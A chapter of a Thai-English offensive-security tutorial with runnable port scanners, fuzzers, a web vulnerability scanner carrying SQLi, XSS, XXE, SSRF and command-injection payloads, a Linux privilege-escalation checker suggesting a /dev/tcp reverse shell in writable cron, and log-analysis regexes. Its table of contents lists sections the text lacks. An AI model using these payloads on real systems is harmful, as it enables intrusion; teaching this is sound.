# Part 65: Custom Security Tool Development

## สารบัญ
1. [Tool Development Overview](#overview)
2. [Python Security Tools](#python-tools)
3. [Go Security Tools](#go-tools)
4. [Custom Scanners](#scanners)
5. [Exploit Development Tools](#exploit-tools)
6. [C2 Framework Development](#c2-dev)
7. [Post-Exploitation Tools](#post-exploit)
8. [Defense Tools](#defense-tools)
9. [Tool Integration](#integration)
10. [Publishing และ Documentation](#publishing)

---

## 1. Tool Development Overview {#overview}

```
Tool Categories:

1. Reconnaissance Tools
   - Port scanners, subdomain finders
   - OSINT automation
   - Tech fingerprinters

2. Exploitation Tools  
   - Vulnerability scanners
   - Exploit frameworks
   - Payload generators

3. Post-Exploitation Tools
   - Persistence mechanisms
   - Data exfiltration
   - Lateral movement

4. Defense Tools
   - Log analyzers
   - IDS rules
   - Threat hunting

Design Principles:
- Modular architecture
- Async/concurrent for performance  
- Clear error handling
- Config files for flexibility
```

---

## 2. Python Security Tools {#python-tools}

### Network Scanner (Async)

```python
#!/usr/bin/env python3
# async_scanner.py - High-performance async port scanner

import asyncio
import socket
import sys
import time
from dataclasses import dataclass, field
from typing import List, Optional

@dataclass
class ScanResult:
    host: str
    port: int
    state: str  # 'open', 'closed', 'filtered'
    banner: str = ''
    service: str = ''

class AsyncPortScanner:
    def __init__(self, timeout: float = 1.0, concurrency: int = 500):
        self.timeout = timeout
        self.concurrency = concurrency
        self.results: List[ScanResult] = []
    
    async def check_port(self, host: str, port: int, semaphore: asyncio.Semaphore) -> Optional[ScanResult]:
        async with semaphore:
            try:
                conn = asyncio.open_connection(host, port)
                reader, writer = await asyncio.wait_for(conn, timeout=self.timeout)
                
                # พยายามสอบใจ banner
                try:
                    banner_raw = await asyncio.wait_for(reader.read(1024), timeout=2.0)
                    banner = banner_raw.decode('utf-8', errors='ignore').strip()
                except:
                    banner = ''
                
                writer.close()
                await writer.wait_closed()
                
                service = self._identify_service(port, banner)
                return ScanResult(host, port, 'open', banner[:200], service)
            
            except asyncio.TimeoutError:
                return ScanResult(host, port, 'filtered')
            except ConnectionRefusedError:
                return None  # closed
            except Exception:
                return None
    
    def _identify_service(self, port: int, banner: str) -> str:
        common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 9200: 'Elasticsearch',
            27017: 'MongoDB'
        }
        
        # ส่วนใหญ่ identify จาก banner
        if 'SSH' in banner:
            return 'SSH'
        elif 'HTTP' in banner or 'html' in banner.lower():
            return 'HTTP'
        elif 'FTP' in banner:
            return 'FTP'
        
        return common_ports.get(port, f'port-{port}')
    
    async def scan_host(self, host: str, ports: List[int]) -> List[ScanResult]:
        semaphore = asyncio.Semaphore(self.concurrency)
        tasks = [self.check_port(host, port, semaphore) for port in ports]
        results = await asyncio.gather(*tasks)
        return [r for r in results if r and r.state == 'open']
    
    async def scan_range(self, hosts: List[str], ports: List[int]):
        for host in hosts:
            print(f"[*] Scanning {host}...")
            results = await self.scan_host(host, ports)
            self.results.extend(results)
            for r in results:
                service_info = f"{r.service}: {r.banner[:50]}" if r.banner else r.service
                print(f"  [{r.port}] OPEN - {service_info}")
    
    def print_summary(self):
        open_ports = [r for r in self.results if r.state == 'open']
        print(f"\n[+] Summary: {len(open_ports)} open ports found")
        for r in sorted(open_ports, key=lambda x: (x.host, x.port)):
            print(f"  {r.host}:{r.port} ({r.service})")

async def main():
    import ipaddress
    
    # Parse target
    target = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.1'
    
    # Generate host list
    try:
        network = ipaddress.ip_network(target, strict=False)
        hosts = [str(ip) for ip in network.hosts()]
    except:
        hosts = [target]
    
    # Common ports
    ports = list(range(1, 1025)) + [3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017]
    
    scanner = AsyncPortScanner(timeout=1.0, concurrency=500)
    
    start = time.time()
    await scanner.scan_range(hosts, ports)
    elapsed = time.time() - start
    
    scanner.print_summary()
    print(f"\n[+] Scan completed in {elapsed:.2f}s")

if __name__ == '__main__':
    asyncio.run(main())
```

### Web Fuzzer

```python
#!/usr/bin/env python3
# web_fuzzer.py - Async web directory/parameter fuzzer

import asyncio
import aiohttp
import sys
from urllib.parse import urljoin, urlparse
from typing import List, Optional
import json

class WebFuzzer:
    def __init__(self, base_url: str, wordlist: str,
                 concurrency: int = 50, timeout: float = 10.0):
        self.base_url = base_url.rstrip('/')
        self.wordlist = wordlist
        self.concurrency = concurrency
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.found = []
    
    async def fuzz_path(self, session: aiohttp.ClientSession,
                       path: str, semaphore: asyncio.Semaphore) -> Optional[dict]:
        async with semaphore:
            url = f"{self.base_url}/{path}"
            try:
                async with session.get(url) as resp:
                    if resp.status not in [404, 400]:
                        content = await resp.text()
                        return {
                            'url': url,
                            'status': resp.status,
                            'length': len(content),
                            'content_type': resp.headers.get('content-type', '')
                        }
            except:
                pass
            return None
    
    async def fuzz_params(self, session: aiohttp.ClientSession,
                         url: str, param: str, values: List[str],
                         semaphore: asyncio.Semaphore):
        """Fuzz URL parameter values"""
        async with semaphore:
            for value in values:
                full_url = f"{url}?{param}={value}"
                try:
                    async with session.get(full_url) as resp:
                        content = await resp.text()
                        if resp.status == 200:
                            # หาสัญญาณ interesting response
                            if 'error' in content.lower() or 'exception' in content.lower():
                                print(f"[!] Interesting: {full_url}")
                except:
                    pass
    
    async def run(self):
        """Run the fuzzer"""
        # Load wordlist
        with open(self.wordlist, 'r', errors='ignore') as f:
            words = [w.strip() for w in f if w.strip() and not w.startswith('#')]
        
        print(f"[*] Fuzzing {self.base_url} with {len(words)} words")
        
        semaphore = asyncio.Semaphore(self.concurrency)
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=self.timeout,
            headers={'User-Agent': 'Mozilla/5.0'}
        ) as session:
            
            tasks = [self.fuzz_path(session, w, semaphore) for w in words]
            
            # Process in chunks
            chunk_size = 1000
            for i in range(0, len(tasks), chunk_size):
                chunk = tasks[i:i+chunk_size]
                results = await asyncio.gather(*chunk)
                
                for r in results:
                    if r:
                        self.found.append(r)
                        print(f"[{r['status']}] {r['url']} ({r['length']} bytes)")
                
                progress = min(i + chunk_size, len(tasks))
                print(f"  Progress: {progress}/{len(tasks)}", end='\r')
        
        print(f"\n[+] Found {len(self.found)} results")
        return self.found
    
    def save_results(self, output_file: str):
        with open(output_file, 'w') as f:
            json.dump(self.found, f, indent=2)
        print(f"[+] Results saved to {output_file}")

async def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <wordlist>")
        sys.exit(1)
    
    fuzzer = WebFuzzer(sys.argv[1], sys.argv[2])
    await fuzzer.run()
    fuzzer.save_results('fuzz_results.json')

if __name__ == '__main__':
    asyncio.run(main())
```

---

## 3. Go Security Tools {#go-tools}

### Fast Port Scanner in Go

```go
// main.go - Fast concurrent port scanner
package main

import (
    "fmt"
    "net"
    "os"
    "sync"
    "time"
    "sort"
    "strconv"
    "strings"
)

type ScanResult struct {
    Host   string
    Port   int
    Open   bool
    Banner string
}

func scanPort(host string, port int, timeout time.Duration, results chan<- ScanResult, wg *sync.WaitGroup) {
    defer wg.Done()
    
    address := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", address, timeout)
    
    if err != nil {
        return // closed or filtered
    }
    defer conn.Close()
    
    // Grab banner
    banner := ""
    conn.SetDeadline(time.Now().Add(2 * time.Second))
    buf := make([]byte, 1024)
    n, err := conn.Read(buf)
    if err == nil {
        banner = strings.TrimSpace(string(buf[:n]))
    }
    
    results <- ScanResult{
        Host:   host,
        Port:   port,
        Open:   true,
        Banner: banner,
    }
}

func scanHost(host string, ports []int, timeout time.Duration) []ScanResult {
    results := make(chan ScanResult, len(ports))
    var wg sync.WaitGroup
    
    // Semaphore สำหรับ limit concurrency
    semaphore := make(chan struct{}, 500)
    
    for _, port := range ports {
        wg.Add(1)
        semaphore <- struct{}{}
        go func(p int) {
            defer func() { <-semaphore }()
            scanPort(host, p, timeout, results, &wg)
        }(port)
    }
    
    go func() {
        wg.Wait()
        close(results)
    }()
    
    var openPorts []ScanResult
    for r := range results {
        openPorts = append(openPorts, r)
    }
    
    sort.Slice(openPorts, func(i, j int) bool {
        return openPorts[i].Port < openPorts[j].Port
    })
    
    return openPorts
}

func main() {
    if len(os.Args) < 2 {
        fmt.Printf("Usage: %s <host> [ports]\n", os.Args[0])
        os.Exit(1)
    }
    
    host := os.Args[1]
    
    // Default ports
    var ports []int
    if len(os.Args) > 2 {
        for _, p := range strings.Split(os.Args[2], ",") {
            port, _ := strconv.Atoi(p)
            ports = append(ports, port)
        }
    } else {
        for i := 1; i <= 1024; i++ {
            ports = append(ports, i)
        }
    }
    
    fmt.Printf("[*] Scanning %s (%d ports)...\n", host, len(ports))
    start := time.Now()
    
    results := scanHost(host, ports, 2*time.Second)
    
    fmt.Printf("\n[+] Open ports:\n")
    for _, r := range results {
        bannerStr := ""
        if r.Banner != "" {
            bannerStr = fmt.Sprintf(" - %s", r.Banner[:min(len(r.Banner), 60)])
        }
        fmt.Printf("  %d/tcp OPEN%s\n", r.Port, bannerStr)
    }
    
    elapsed := time.Since(start)
    fmt.Printf("\n[+] %d open ports found in %v\n", len(results), elapsed)
}

func min(a, b int) int {
    if a < b { return a }
    return b
}

// Build:
// go build -o scanner main.go
// ./scanner 192.168.1.1 80,443,22,21
```

### HTTP Fuzzer in Go

```go
// http_fuzzer.go
package main

import (
    "bufio"
    "crypto/tls"
    "fmt"
    "net/http"
    "os"
    "sync"
    "sync/atomic"
    "time"
)

type FuzzResult struct {
    URL        string
    StatusCode int
    Length     int
    Words      int
}

func fuzzURL(client *http.Client, baseURL, path string, results chan<- FuzzResult, sem chan struct{}, wg *sync.WaitGroup) {
    defer wg.Done()
    sem <- struct{}{}
    defer func() { <-sem }()
    
    url := baseURL + "/" + path
    
    req, _ := http.NewRequest("GET", url, nil)
    req.Header.Set("User-Agent", "Mozilla/5.0")
    
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    if resp.StatusCode != 404 {
        results <- FuzzResult{
            URL:        url,
            StatusCode: resp.StatusCode,
            Length:     int(resp.ContentLength),
        }
    }
}

func main() {
    if len(os.Args) < 3 {
        fmt.Printf("Usage: %s <url> <wordlist>\n", os.Args[0])
        os.Exit(1)
    }
    
    baseURL := os.Args[1]
    wordlist := os.Args[2]
    
    // HTTP client ที่ ignore TLS errors
    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse  // ไม่ follow redirects
        },
    }
    
    // Load wordlist
    f, _ := os.Open(wordlist)
    defer f.Close()
    
    results := make(chan FuzzResult, 1000)
    sem := make(chan struct{}, 100)  // 100 concurrent
    var wg sync.WaitGroup
    var total int64
    
    go func() {
        scanner := bufio.NewScanner(f)
        for scanner.Scan() {
            word := scanner.Text()
            if word == "" || word[0] == '#' {
                continue
            }
            wg.Add(1)
            atomic.AddInt64(&total, 1)
            go fuzzURL(client, baseURL, word, results, sem, &wg)
        }
        wg.Wait()
        close(results)
    }()
    
    fmt.Printf("[*] Fuzzing %s\n", baseURL)
    found := 0
    for r := range results {
        found++
        fmt.Printf("[%d] %s (length: %d)\n", r.StatusCode, r.URL, r.Length)
    }
    
    fmt.Printf("[+] Found %d results from %d requests\n", found, total)
}
```

---

## 4. Custom Scanners {#scanners}

### Vulnerability Scanner

```python
#!/usr/bin/env python3
# vuln_scanner.py - Basic vulnerability scanner

import asyncio
import aiohttp
import json
from typing import List, Dict

class VulnScanner:
    def __init__(self):
        self.checks = [
            self.check_open_redirect,
            self.check_sql_injection,
            self.check_xss,
            self.check_path_traversal,
            self.check_xxe,
            self.check_ssrf,
            self.check_command_injection,
        ]
    
    async def check_open_redirect(self, session, url):
        payloads = [
            '?url=https://evil.com',
            '?redirect=https://evil.com',
            '?next=//evil.com',
            '?return=https://evil.com',
        ]
        results = []
        for p in payloads:
            try:
                test_url = url + p
                async with session.get(test_url, allow_redirects=False) as r:
                    if r.status in [301, 302, 307, 308]:
                        loc = r.headers.get('Location', '')
                        if 'evil.com' in loc:
                            results.append({
                                'type': 'Open Redirect',
                                'url': test_url,
                                'severity': 'Medium'
                            })
            except:
                pass
        return results
    
    async def check_sql_injection(self, session, url):
        payloads = [
            "'",
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND sleep(5)--",  # Time-based
        ]
        
        errors = ['sql syntax', 'mysql error', 'ora-', 'postgresql', 'sqlite']
        results = []
        
        for payload in payloads:
            try:
                test_url = url + '?id=' + payload
                async with session.get(test_url) as r:
                    content = (await r.text()).lower()
                    if any(e in content for e in errors):
                        results.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
            except:
                pass
        return results
    
    async def check_xss(self, session, url):
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><img src=x onerror=alert(1)>",
            '<svg onload=alert(1)>',
        ]
        results = []
        
        for payload in payloads:
            try:
                test_url = url + '?q=' + payload
                async with session.get(test_url) as r:
                    content = await r.text()
                    if payload in content:
                        results.append({
                            'type': 'XSS',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
            except:
                pass
        return results
    
    async def check_path_traversal(self, session, url):
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//etc//passwd',
        ]
        
        unix_indicators = ['root:', 'daemon:', '/bin/bash']
        win_indicators = ['[extensions]', '[fonts]', 'for 16-bit']
        results = []
        
        for payload in payloads:
            try:
                test_url = url + '?file=' + payload
                async with session.get(test_url) as r:
                    content = await r.text()
                    if any(i in content for i in unix_indicators + win_indicators):
                        results.append({
                            'type': 'Path Traversal',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
            except:
                pass
        return results
    
    async def check_xxe(self, session, url):
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''
        
        try:
            async with session.post(url, data=xxe_payload,
                                   headers={'Content-Type': 'application/xml'}) as r:
                content = await r.text()
                if 'root:' in content or 'daemon:' in content:
                    return [{'type': 'XXE', 'url': url, 'severity': 'Critical'}]
        except:
            pass
        return []
    
    async def check_ssrf(self, session, url):
        # ใช้ Burp Collaborator หรือ similar
        payloads = [
            'http://169.254.169.254/latest/meta-data/',  # AWS IMDS
            'http://metadata.google.internal/',  # GCP metadata
            'http://127.0.0.1:22',  # Internal service
        ]
        results = []
        
        for payload in payloads:
            try:
                test_url = url + '?url=' + payload
                async with session.get(test_url) as r:
                    content = await r.text()
                    if any(x in content for x in ['ami-id', 'instance-id', 'SSH']):
                        results.append({
                            'type': 'SSRF',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
            except:
                pass
        return results
    
    async def check_command_injection(self, session, url):
        payloads = [
            '; whoami',
            '| whoami',
            '`whoami`',
            '$(whoami)',
            '; sleep 5',  # Time-based
        ]
        results = []
        
        for payload in payloads:
            try:
                test_url = url + '?input=' + payload
                import time
                start = time.time()
                async with session.get(test_url) as r:
                    content = await r.text()
                    elapsed = time.time() - start
                    
                    # Check for output or time delay
                    if 'root' in content or 'www-data' in content or elapsed > 4:
                        results.append({
                            'type': 'Command Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
            except:
                pass
        return results
    
    async def scan(self, url: str) -> List[Dict]:
        """Run all checks against target"""
        all_findings = []
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [check(session, url) for check in self.checks]
            results = await asyncio.gather(*tasks)
            
            for result_list in results:
                all_findings.extend(result_list)
        
        return all_findings
    
    def generate_report(self, findings: List[Dict], output_file: str = None):
        """Generate vulnerability report"""
        severity_order = ['Critical', 'High', 'Medium', 'Low', 'Info']
        
        # Sort by severity
        sorted_findings = sorted(findings, 
            key=lambda x: severity_order.index(x.get('severity', 'Info')))
        
        report = {
            'total': len(findings),
            'by_severity': {},
            'findings': sorted_findings
        }
        
        for f in findings:
            sev = f.get('severity', 'Info')
            report['by_severity'][sev] = report['by_severity'].get(sev, 0) + 1
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
        
        print("\n=== Vulnerability Report ===")
        for sev, count in report['by_severity'].items():
            print(f"  {sev}: {count}")
        print(f"Total findings: {len(findings)}")
        
        return report

async def main():
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else 'http://testphp.vulnweb.com'
    
    scanner = VulnScanner()
    print(f"[*] Scanning {url}")
    findings = await scanner.scan(url)
    scanner.generate_report(findings, 'vuln_report.json')

if __name__ == '__main__':
    asyncio.run(main())
```

---

## 5. Post-Exploitation Tools {#post-exploit}

### Automated Privilege Escalation Check

```python
#!/usr/bin/env python3
# privesc_check.py - Linux privilege escalation checker

import subprocess
import os
import stat

class LinuxPrivEscChecker:
    def __init__(self):
        self.findings = []
    
    def run_cmd(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, 
                                   text=True, timeout=5)
            return result.stdout.strip()
        except:
            return ''
    
    def check_suid_files(self):
        """SUID/SGID ไฟล์"""
        print("[*] Checking SUID/SGID files...")
        suid_files = self.run_cmd('find / -perm -4000 -type f 2>/dev/null')
        
        dangerous = ['bash', 'sh', 'python', 'perl', 'ruby', 'vim', 'nano',
                    'nmap', 'find', 'awk', 'gdb', 'php', 'node']
        
        for line in suid_files.split('\n'):
            if line and any(d in line.lower() for d in dangerous):
                self.findings.append({
                    'category': 'SUID Binary',
                    'finding': line,
                    'severity': 'High',
                    'exploit': f'Check GTFOBins for: {line}'
                })
                print(f"  [SUID] {line}")
    
    def check_sudo_rights(self):
        """Sudo privileges"""
        print("[*] Checking sudo rights...")
        sudo_list = self.run_cmd('sudo -l 2>/dev/null')
        
        if '(ALL)' in sudo_list or 'NOPASSWD' in sudo_list:
            self.findings.append({
                'category': 'Sudo Rights',
                'finding': sudo_list,
                'severity': 'Critical',
                'exploit': 'sudo -l then check GTFOBins'
            })
            print(f"  [SUDO] {sudo_list[:200]}")
    
    def check_writable_cron(self):
        """Writable cron jobs"""
        print("[*] Checking cron jobs...")
        cron_dirs = ['/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.hourly/',
                    '/var/spool/cron/']
        
        for cron_dir in cron_dirs:
            if os.path.exists(cron_dir):
                for f in os.listdir(cron_dir):
                    path = os.path.join(cron_dir, f)
                    if os.access(path, os.W_OK):
                        self.findings.append({
                            'category': 'Writable Cron',
                            'finding': path,
                            'severity': 'High',
                            'exploit': f'echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> {path}'
                        })
                        print(f"  [CRON-W] {path}")
    
    def check_kernel_version(self):
        """Kernel exploits"""
        print("[*] Checking kernel version...")
        kernel = self.run_cmd('uname -r')
        distro = self.run_cmd('cat /etc/os-release 2>/dev/null | grep PRETTY')
        
        print(f"  Kernel: {kernel}")
        print(f"  Distro: {distro}")
        
        # Known vulnerable kernels
        vulnerable_kernels = [
            ('4.4', 'CVE-2016-5195 (Dirty COW)'),
            ('5.8', 'CVE-2022-0847 (Dirty Pipe)'),
            ('3.x', 'CVE-2016-4997 (Netfilter)'),
        ]
        
        for ver, cve in vulnerable_kernels:
            if kernel.startswith(ver):
                self.findings.append({
                    'category': 'Kernel Exploit',
                    'finding': f'Kernel {kernel} may be vulnerable',
                    'severity': 'High',
                    'exploit': cve
                })
    
    def check_path_hijack(self):
        """PATH hijacking โอกาส"""
        print("[*] Checking PATH hijack opportunities...")
        path = os.environ.get('PATH', '')
        
        # ตรวจสอบว่ามี writable directories ใน PATH
        for d in path.split(':'):
            if d and os.path.exists(d) and os.access(d, os.W_OK):
                self.findings.append({
                    'category': 'Writable PATH',
                    'finding': d,
                    'severity': 'High',
                    'exploit': f'Create malicious binary in {d}'
                })
                print(f"  [PATH-W] {d}")
    
    def check_world_writable(self):
        """World-writable files/dirs"""
        print("[*] Checking world-writable files...")
        writable = self.run_cmd(
            'find /etc /var /tmp /opt -writable -type f 2>/dev/null | '
            'grep -v proc | grep -v sys'
        )
        
        for f in writable.split('\n')[:20]:  # limit output
            if f:
                self.findings.append({
                    'category': 'World Writable',
                    'finding': f,
                    'severity': 'Medium'
                })
    
    def run_all_checks(self):
        """Run all privilege escalation checks"""
        print("=" * 50)
        print("Linux Privilege Escalation Checker")
        print("=" * 50)
        print(f"Current user: {self.run_cmd('whoami')}")
        print(f"Hostname: {self.run_cmd('hostname')}")
        print()
        
        self.check_sudo_rights()
        self.check_suid_files()
        self.check_writable_cron()
        self.check_kernel_version()
        self.check_path_hijack()
        self.check_world_writable()
        
        print("\n=== FINDINGS ===")
        critical = [f for f in self.findings if f['severity'] == 'Critical']
        high = [f for f in self.findings if f['severity'] == 'High']
        
        for severity, items in [('CRITICAL', critical), ('HIGH', high)]:
            if items:
                print(f"\n[{severity}]")
                for item in items:
                    print(f"  {item['category']}: {item['finding'][:80]}")
                    if 'exploit' in item:
                        print(f"    Exploit: {item['exploit'][:80]}")
        
        print(f"\nTotal findings: {len(self.findings)}")
        return self.findings

if __name__ == '__main__':
    checker = LinuxPrivEscChecker()
    checker.run_all_checks()
```

---

## 6. Defense Tools {#defense-tools}

### Log Analyzer

```python
#!/usr/bin/env python3
# log_analyzer.py - วิเคราะห์ log หาการโจมตี

import re
import json
from collections import defaultdict
from datetime import datetime

class SecurityLogAnalyzer:
    def __init__(self):
        self.patterns = {
            'brute_force': re.compile(
                r'Failed password for (\S+) from (\d+\.\d+\.\d+\.\d+)'
            ),
            'port_scan': re.compile(
                r'connection attempt from (\d+\.\d+\.\d+\.\d+)'
            ),
            'sql_injection': re.compile(
                r"(union|select|insert|drop|delete|update|exec)\s", re.I
            ),
            'xss': re.compile(
                r'<script|onerror=|onload=|javascript:', re.I
            ),
            'path_traversal': re.compile(
                r'\.\./|%2e%2e/', re.I
            ),
        }
        self.failed_logins = defaultdict(list)
        self.alerts = []
    
    def analyze_auth_log(self, log_file: str):
        """Analyze /var/log/auth.log"""
        print(f"[*] Analyzing {log_file}...")
        
        with open(log_file, 'r', errors='ignore') as f:
            for line in f:
                # หา failed logins
                match = self.patterns['brute_force'].search(line)
                if match:
                    username, ip = match.groups()
                    self.failed_logins[ip].append({
                        'user': username,
                        'line': line.strip()
                    })
        
        # Detect brute force (มากกว่า 5 ครั้ง = alert)
        for ip, attempts in self.failed_logins.items():
            if len(attempts) >= 5:
                self.alerts.append({
                    'type': 'Brute Force',
                    'source_ip': ip,
                    'count': len(attempts),
                    'severity': 'High' if len(attempts) > 20 else 'Medium'
                })
    
    def analyze_web_log(self, log_file: str):
        """Analyze web server access log"""
        print(f"[*] Analyzing web log {log_file}...")
        
        requests_by_ip = defaultdict(int)
        
        with open(log_file, 'r', errors='ignore') as f:
            for line in f:
                # Apache/Nginx combined log format
                # 1.2.3.4 - - [date] "GET /path?q=payload HTTP/1.1" 200 1234
                
                # Check for attack patterns
                for pattern_name, pattern in self.patterns.items():
                    if pattern_name in ['sql_injection', 'xss', 'path_traversal']:
                        if pattern.search(line):
                            # Extract IP จากต้นบรรทัด
                            ip_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)', line)
                            ip = ip_match.group(1) if ip_match else 'Unknown'
                            
                            self.alerts.append({
                                'type': pattern_name,
                                'source_ip': ip,
                                'line': line[:200],
                                'severity': 'High'
                            })
    
    def generate_report(self):
        """Generate security report"""
        print("\n=" * 40)
        print("SECURITY LOG ANALYSIS REPORT")
        print("=" * 40)
        
        # Group by type
        by_type = defaultdict(list)
        for alert in self.alerts:
            by_type[alert['type']].append(alert)
        
        for alert_type, alerts in by_type.items():
            print(f"\n[{alert_type.upper()}] - {len(alerts)} incidents")
            for a in alerts[:5]:  # Show top 5
                print(f"  Source: {a['source_ip']}")
                if 'count' in a:
                    print(f"  Count: {a['count']}")
        
        print(f"\nTotal alerts: {len(self.alerts)}")
        
        # Top attacking IPs
        ip_counts = defaultdict(int)
        for alert in self.alerts:
            ip_counts[alert.get('source_ip', 'Unknown')] += 1
        
        print("\nTop attacking IPs:")
        for ip, count in sorted(ip_counts.items(), key=lambda x: -x[1])[:10]:
            print(f"  {ip}: {count} incidents")
        
        return self.alerts

# ใช้งาน:
analyzer = SecurityLogAnalyzer()
analyzer.analyze_auth_log('/var/log/auth.log')
analyzer.analyze_web_log('/var/log/nginx/access.log')
report = analyzer.generate_report()
```

---

## 7. Tool Integration {#integration}

### Pipeline Framework

```python
#!/usr/bin/env python3
# recon_pipeline.py - Automate recon workflow

import subprocess
import json
import os
import asyncio
from pathlib import Path

class ReconPipeline:
    def __init__(self, target: str, output_dir: str = 'recon_output'):
        self.target = target
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.results = {}
    
    def run_tool(self, name: str, cmd: str) -> str:
        """Run external tool และบันทึกผล"""
        print(f"[*] Running {name}...")
        output_file = self.output_dir / f"{name}_output.txt"
        
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, 
                text=True, timeout=120
            )
            output = result.stdout + result.stderr
            
            with open(output_file, 'w') as f:
                f.write(output)
            
            print(f"[+] {name} completed - saved to {output_file}")
            self.results[name] = {
                'output_file': str(output_file),
                'lines': len(output.split('\n'))
            }
            return output
        
        except subprocess.TimeoutExpired:
            print(f"[-] {name} timed out")
            return ''
        except Exception as e:
            print(f"[-] {name} failed: {e}")
            return ''
    
    def run_full_recon(self):
        """Run complete recon pipeline"""
        print(f"=== Starting recon for {self.target} ===")
        
        # 1. Subdomain enumeration
        self.run_tool('amass', f'amass enum -d {self.target} -passive -o {self.output_dir}/amass.txt')
        self.run_tool('subfinder', f'subfinder -d {self.target} -o {self.output_dir}/subfinder.txt')
        
        # 2. Merge subdomains
        self.run_tool('combine', 
            f'cat {self.output_dir}/amass.txt {self.output_dir}/subfinder.txt | sort -u > {self.output_dir}/subdomains.txt')
        
        # 3. DNS resolution
        self.run_tool('massdns', 
            f'massdns -r /opt/massdns/lists/resolvers.txt '
            f'-t A {self.output_dir}/subdomains.txt > {self.output_dir}/resolved.txt')
        
        # 4. HTTP probe
        self.run_tool('httpx',
            f'cat {self.output_dir}/subdomains.txt | httpx -silent -o {self.output_dir}/live_hosts.txt')
        
        # 5. Screenshot
        self.run_tool('eyewitness',
            f'EyeWitness.py --web -f {self.output_dir}/live_hosts.txt '
            f'-d {self.output_dir}/screenshots')
        
        # 6. Directory fuzzing on each host
        with open(f'{self.output_dir}/live_hosts.txt', 'r') as f:
            hosts = [h.strip() for h in f if h.strip()]
        
        for host in hosts[:10]:  # Limit to 10 for demo
            self.run_tool(f'fuzz_{host.replace("http://","").replace("https://","")}',
                f'gobuster dir -u {host} -w /usr/share/wordlists/dirb/common.txt '
                f'-o {self.output_dir}/fuzz_{host}.txt -q')
        
        # Generate summary
        self.generate_summary()
    
    def generate_summary(self):
        summary = {
            'target': self.target,
            'tools_run': list(self.results.keys()),
            'output_dir': str(self.output_dir)
        }
        
        # Count subdomains
        subdomain_file = self.output_dir / 'subdomains.txt'
        if subdomain_file.exists():
            with open(subdomain_file) as f:
                summary['subdomains'] = len([l for l in f if l.strip()])
        
        with open(self.output_dir / 'summary.json', 'w') as f:
            json.dump(summary, f, indent=2)
        
        print(f"\n[+] Recon complete! Summary:")
        print(json.dumps(summary, indent=2))

# ใช้งาน:
pipeline = ReconPipeline('target.com')
pipeline.run_full_recon()
```

---

## สรุป

| Language | Use Case | Performance | Portability |
|----------|----------|-------------|-------------|
| Python | Rapid development | Medium | High |
| Go | Fast scanners | Very High | High |
| Rust | Memory-safe tools | Highest | High |
| C | Low-level exploits | Highest | Medium |
| PowerShell | Windows tools | Medium | Windows only |

---

← [Part 64: Evasion Techniques](Part-64-Evasion-Techniques.md) | [Part 66: Incident Response](Part-66-Incident-Response.md) →
